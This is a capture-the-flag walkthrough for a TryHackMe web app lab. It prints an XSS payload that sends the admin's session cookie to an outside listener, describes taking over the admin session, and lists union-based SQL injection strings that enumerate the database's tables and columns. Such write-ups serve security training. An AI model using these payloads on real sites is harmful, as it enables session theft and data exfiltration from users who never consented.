Link: https://tryhackme.com/room/marketplace

This pentest is mainly based in web app security, so I first open website and burp, I run nmap in background but its only 22 and 80 open. I also run 
I registered to this website and login, then I tried to find some input field that I could test XSS, and there we go, basic payload <scipt>alert(1)</script> prove that XSS exist.
What we can do with it? There is option send a bug to admin, so we can send him script that will send his cookies to us, I used this script and run netcat listener on port 6666
<script>new Image().src="http://10.9.91.255:6666/random.php?output="+document.cookie;</script>

The following payload creates a new Image object in the DOM of the current page and sets the src attribute to the attackerâ€™s website. 
As a result, the browser will make an HTTP request to this external website (192.168.149.128) and the URL will contain the session cookie.

When the admin opens the message, his cookies will be sent to us. 
And there we go, I just changed my cookies to his and we became a admin, this proves that XSS is a serious vulnerability. 

  // Database enum VIA SQLi

This site has really poor menu, we cant upload our reverse shell anywhere, but we can check for SQLi in URL. 
Error gives us information about the database and proves that it occurs.

We try to figure out how many columns exist in the databse, I used order by and if error will apear, that means this column does not exist 
I know now there's 4 columns, I can just substitute them to a interesting value such a usernames or passwords, so I do something like this now:
user=33223 union select @@version,2,3,4

Then I can get a databse 
user=33223 union select database(),2,3,4

Note:This union statement will work because user number is incorrect. 

I'll try to get name of tables from information schema.tables
24545 union select (select group_concat(table_name)from information_schema.tables where table_schema=database()),2,3,4

Then lets get column names from information schema.columns
24545 union select (select group_concat(table_name,"--",column_name)from information_schema.columns where table_schema=database()),2,3,4

Since I concat those two, our output looks like: table-column, table-column, table-column.


